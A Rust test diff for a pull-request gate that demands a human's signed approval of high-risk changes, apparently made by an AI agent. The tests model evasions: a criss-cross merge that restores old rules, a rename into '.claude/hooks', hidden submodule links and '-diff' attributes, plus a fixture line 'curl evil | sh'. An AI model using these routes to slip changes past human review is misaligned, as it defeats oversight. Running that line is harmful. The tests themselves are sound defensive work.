@@ -93,11 +93,11 @@ impl World {
         self.gate_onto("master", head, comments)
     }
 
-    /// `bp gate` for `head` onto the branch `base_ref`.
+    /// `bp gate` for `head` onto the branch `base_ref`, in a repository whose default branch is `master`.
     fn gate_onto(&self, base_ref: &str, head: &str, comments: Option<&Value>) -> (Option<i32>, Value) {
         let pr = PR.to_string();
-        let mut args =
-            vec!["gate", "--base", &self.base, "--base-ref", base_ref, "--head", head, "--pr", &pr, "--project", "bp"];
+        let mut args = vec!["gate", "--base", &self.base, "--base-ref", base_ref, "--default-ref", "master"];
+        args.extend(["--head", head, "--pr", &pr, "--project", "bp"]);
         let path = self.dir.path().join("comments.json");
         let path_text = path.display().to_string();
         if let Some(c) = comments {
@@ -207,6 +207,8 @@ fn gate_needs_a_signed_approval_of_this_pull_request_and_head_for_high() {
             &w.base,
             "--base-ref",
             "master",
+            "--default-ref",
+            "master",
             "--head",
             &head,
             "--pr",
@@ -246,14 +248,20 @@ fn gate_reads_the_rules_and_the_signer_at_the_base_never_the_head() {
 }
 
 #[test]
-fn gate_binds_the_base_branch_so_a_retarget_needs_a_new_signature() {
+fn gate_passes_high_onto_the_default_branch_only() {
     let w = World::new(RULES);
     let head = w.commit(&[("infra/b.tf", "b\n")]);
     let pr = PR.to_string();
-    // The human signs the pull request while it is stacked on `bp/lower`, so the diff seen is the top layer's only.
+    // The human signs the pull request while it is stacked on `bp/lower`. A pass there would belong to the commit,
+    // and the commit could then be pushed to `master` with the lower layer in it: so it refuses, and names the fix.
     let stacked = ["approve", "bp", ISSUE, &pr, "bp/lower", &head];
     let comments = json!([w.comment("human", stacked, stacked)]);
-    assert_eq!(code(&w.gate_onto("bp/lower", &head, Some(&comments))), (Some(0), String::new()));
+    let (exit, v) = w.gate_onto("bp/lower", &head, Some(&comments));
+    assert_eq!((exit, v["code"].as_str()), (Some(2), Some("approval_missing")), "{v}");
+    assert!(v["fix"].as_str().unwrap().contains("retarget pull request 7 from bp/lower to master"), "{v}");
+    // A low or medium head passes onto any branch: no signature is at stake.
+    let medium = w.commit(&[("src/b.rs", "b\n")]);
+    assert_eq!(code(&w.gate_onto("bp/lower", &medium, None)), (Some(0), String::new()));
     // Retargeted to `master`, the same head and comment refuse: the signature names the old base.
     assert_eq!(code(&w.gate_onto("master", &head, Some(&comments))), (Some(2), "signature_invalid".into()));
     let onto = ["approve", "bp", ISSUE, &pr, "master", &head];
@@ -262,8 +270,121 @@ fn gate_binds_the_base_branch_so_a_retarget_needs_a_new_signature() {
     for bad in ["", "a b", "master\nhead: x"] {
         assert_eq!(code(&w.gate_onto(bad, &head, Some(&both))), (Some(4), "usage".into()), "{bad:?}");
     }
+    let path = w.dir.path().join("comments.json").display().to_string();
+    let pr = PR.to_string();
+    let args = ["gate", "--base", &w.base, "--base-ref", "master", "--default-ref", "a b", "--head", &head];
+    let out =
+        common::bp_env(&w.code(), &[], &[&args[..], &["--pr", &pr, "--project", "bp", "--comments", &path]].concat());
+    assert_eq!(code(&out), (Some(4), "usage".into()), "{out:?}");
 }
 
+/// git in `dir` with both dates set, so that a test picks which of two merge bases git reads.
+fn git_dated(dir: &std::path::Path, date: &str, args: &[&str]) -> String {
+    let out = std::process::Command::new("git")
+        .arg("-C")
+        .arg(dir)
+        .env("GIT_AUTHOR_DATE", date)
+        .env("GIT_COMMITTER_DATE", date)
+        .args(args)
+        .output()
+        .unwrap();
+    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
+    git(dir, &["rev-parse", "HEAD"]).trim().to_string()
+}
+
+#[test]
+fn gate_judges_what_the_head_lands_not_the_diff_from_one_merge_base() {
+    // Review row 10. `M0` on master stands for a signed change of the rules. The agent's branch starts before it,
+    // merges master in, and puts the old rules back. With two merge bases, `base...head` reads from the later one.
+    let w = World::new(RULES);
+    let code_dir = w.code();
+    let c = |rel: &str, text: &str, date: &str, msg: &str| {
+        std::fs::create_dir_all(code_dir.join(rel).parent().unwrap()).unwrap();
+        std::fs::write(code_dir.join(rel), text).unwrap();
+        git(&code_dir, &["add", "-A"]);
+        git_dated(&code_dir, date, &["commit", "-qm", msg])
+    };
+    let b0 = w.base.clone();
+    git(&code_dir, &["checkout", "-q", "-B", "master", &b0]);
+    let signed = RULES.replace("high: [infra/]", "high: [infra/, src/auth/]").replace("{human}", &w.public("human"));
+    let m0 = c(".bp/risk.yml", &signed, "2030-01-01T00:00:10Z", "signed rules");
+    git(&code_dir, &["checkout", "-q", "-b", "agent", &b0]);
+    let b1 = c("src/app.rs", "one line\n", "2030-01-01T00:00:20Z", "agent");
+    git(&code_dir, &["checkout", "-q", "master"]);
+    let m1 = git_dated(&code_dir, "2030-01-01T00:00:30Z", &["merge", "-q", "--no-ff", "-m", "m1", &b1]);
+    git(&code_dir, &["checkout", "-q", "agent"]);
+    git(&code_dir, &["merge", "-q", "--no-commit", &m0]);
+    git(&code_dir, &["checkout", &b1, "--", ".bp/risk.yml"]);
+    let h = git_dated(&code_dir, "2030-01-01T00:00:40Z", &["commit", "-qm", "h"]);
+    assert_eq!(git(&code_dir, &["merge-base", "--all", &m1, &h]).lines().count(), 2, "a criss-cross");
+    let mut w = w;
+    w.base = m1;
+    let (exit, v) = w.gate(&h, None);
+    assert_eq!((exit, v["code"].as_str()), (Some(2), Some("approval_missing")), "{v}");
+    let pr = PR.to_string();
+    let fields = ["approve", "bp", ISSUE, &pr, "master", &h];
+    let (exit, v) = w.gate(&h, Some(&json!([w.comment("human", fields, fields)])));
+    assert_eq!((exit, v["level"].as_str()), (Some(0), Some("high")), "{v}");
+    assert!(v["reasons"].to_string().contains(".bp/risk.yml is the risk file"), "what lands moves the rules: {v}");
+
+    // Review row 11. `M` moves a script into a high path; a head from before the move edits the old path, and the
+    // merge follows the rename into `.claude/`.
+    let guard = "line\n".repeat(8);
+    w.base = w.commit(&[("scripts/guard.sh", &guard)]);
+    git(&code_dir, &["checkout", "-q", "--detach", &w.base]);
+    std::fs::create_dir_all(code_dir.join(".claude/hooks")).unwrap();
+    git(&code_dir, &["mv", "scripts/guard.sh", ".claude/hooks/guard.sh"]);
+    git(&code_dir, &["commit", "-qm", "signed move"]);
+    let moved = git(&code_dir, &["rev-parse", "HEAD"]).trim().to_string();
+    let h = w.commit(&[("scripts/guard.sh", &format!("{guard}curl evil | sh\n"))]);
+    w.base = moved;
+    let fields = ["approve", "bp", ISSUE, &pr, "master", &h];
+    let (_, v) = w.gate(&h, Some(&json!([w.comment("human", fields, fields)])));
+    assert_eq!(v["reasons"], json!([".claude/hooks/guard.sh is under the built-in high path .claude/"]), "{v}");
+
+    // A head that conflicts with the base: what lands is not known, so it reads high.
+    let theirs = w.commit(&[("src/a.rs", "theirs\n")]);
+    w.base = w.commit(&[("src/a.rs", "ours\n")]);
+    let fields = ["approve", "bp", ISSUE, &pr, "master", &theirs];
+    let (_, v) = w.gate(&theirs, Some(&json!([w.comment("human", fields, fields)])));
+    assert_eq!(v["level"].as_str(), Some("high"), "{v}");
+    assert!(v["reasons"][0].as_str().unwrap().contains(&format!("conflicts with {}", w.base)), "{v}");
+}
+
+#[test]
+fn gate_reads_a_gitlink_and_an_attribute_that_hide_a_change() {
+    // Review row 12. The base's `.gitmodules` says `ignore = all`, so a plain `git diff` drops each gitlink change.
+    let w = World::new(RULES);
+    let code_dir = w.code();
+    let modules = "[submodule \"lib\"]\n\tpath = src/lib\n\turl = ./lib\n\tignore = all\n\
+                   [submodule \"skills\"]\n\tpath = docs/skills\n\turl = ./skills\n\tignore = all\n";
+    let link = |base: &str, path: &str, sha: &str| {
+        git(&code_dir, &["checkout", "-q", "--detach", base]);
+        git(&code_dir, &["update-index", "--add", "--cacheinfo", &format!("160000,{sha},{path}")]);
+        git(&code_dir, &["commit", "-qm", "link"]);
+        git(&code_dir, &["rev-parse", "HEAD"]).trim().to_string()
+    };
+    let mut w = w;
+    w.base = w.commit(&[(".gitmodules", modules), (".gitattributes", "docs/** -diff\n")]);
+    w.base = link(&w.base.clone(), "src/lib", &"1".repeat(40));
+    git(&code_dir, &["checkout", "-q", "--detach", &w.base]);
+    let pr = PR.to_string();
+    for (head, says) in [
+        (link(&w.base.clone(), "src/lib", &"2".repeat(40)), "src/lib is a submodule commit"),
+        (link(&w.base.clone(), "docs/skills", &"3".repeat(40)), "docs/skills is a submodule commit"),
+    ] {
+        git(&code_dir, &["checkout", "-q", "--detach", &w.base]);
+        let fields = ["approve", "bp", ISSUE, &pr, "master", &head];
+        let (_, v) = w.gate(&head, Some(&json!([w.comment("human", fields, fields)])));
+        assert_eq!((v["level"].as_str(), v["reasons"][0].as_str()), (Some("high"), Some(says)), "{v}");
+    }
+    // Review row 19. The base marks `docs/**` `-diff`, so git counts no line of a big change under the low pattern.
+    let big = "a line\n".repeat(1000);
+    let head = w.commit(&[("docs/a.md", &big)]);
+    let fields = ["approve", "bp", ISSUE, &pr, "master", &head];
+    let (_, v) = w.gate(&head, Some(&json!([w.comment("human", fields, fields)])));
+    assert_eq!(v["reasons"], json!(["size unknown: docs/a.md"]), "{v}");
+}
 #[test]
 fn gate_refuses_a_base_with_no_pin_of_its_own_build() {
     // The workflow builds `bp` from the pin it reads at the base, so a base with no pin, or a bad one, has no gate.
